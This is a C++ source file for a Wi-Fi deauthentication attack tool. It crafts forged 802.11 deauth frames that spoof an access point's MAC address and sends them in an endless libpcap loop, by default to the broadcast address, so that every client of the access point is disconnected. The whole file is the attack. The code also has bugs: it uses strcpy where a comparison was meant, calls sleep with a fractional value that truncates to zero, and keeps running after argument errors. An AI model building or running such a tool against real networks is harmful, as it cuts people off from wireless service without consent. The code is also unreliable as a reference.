#include <iostream>
#include <cstdio>
#include <netinet/in.h>
#include <cstdbool>
#include <pcap.h>
#include <string>
#include "mac.h"
#include <vector>
#include <unistd.h>

using namespace std;

void print_syntax() {
    cout << "syntax: deauth-attack <interface> <ap mac> [<station mac>] [-auth]" << endl;
    cout << "sample : deauth-attack mon0 A2:EE:8F:22:18:45 02:2A:70:0F:10:FF" << endl;
}

struct RadioTapHdr {
    uint8_t ver = 0x00;
    uint8_t pad = 0x00;
    uint16_t len = 0x000c;
    uint32_t present = 0x00008004;
    uint32_t data = 0x00180002;
};

struct DeauthFrame {
    uint8_t type = 0xc0;
    uint8_t subtype = 0x00;
    uint16_t duration = 0x0000;
    Mac recv_mac;
    Mac trans_mac;
    Mac bssid;
    uint16_t frag_seq_num = 0x1000;
    uint16_t reason_code = 0x0007;
};

struct DeauthPacket {
    struct RadioTapHdr rth;
    struct DeauthFrame df;
};

// https://makejarvis.tistory.com/58

int main(int argc, char* argv[]) {
    Mac ap_mac;
    Mac sta_mac;
    int is_auth = 0;

    // parsing
    if (argc == 3) {
        ap_mac = Mac(argv[2]);
        sta_mac = Mac("ff:ff:ff:ff:ff:ff");
    }
    else if (argc == 4) {
        ap_mac = Mac(argv[2]);
        sta_mac = Mac(argv[3]);
    }
    else if (argc == 5) {
        ap_mac = Mac(argv[2]);
        sta_mac = Mac(argv[3]);
        if (strcpy(argv[4], "-auth") == 0) {
            is_auth = 1;
        }
        else {
            cout << "parameter error!" << endl;
            print_syntax();
        }
    }
    else {
        cout << "parameter error!" << endl;
        print_syntax();
    }

    // pcap open
    char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
		return -1;
	}

    struct DeauthPacket dp;
    
    dp.df.trans_mac = ap_mac;
    dp.df.bssid = ap_mac;
    dp.df.recv_mac = sta_mac;

    while(true) {
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&dp), sizeof(struct DeauthPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        }
        sleep(0.5);
    }
}


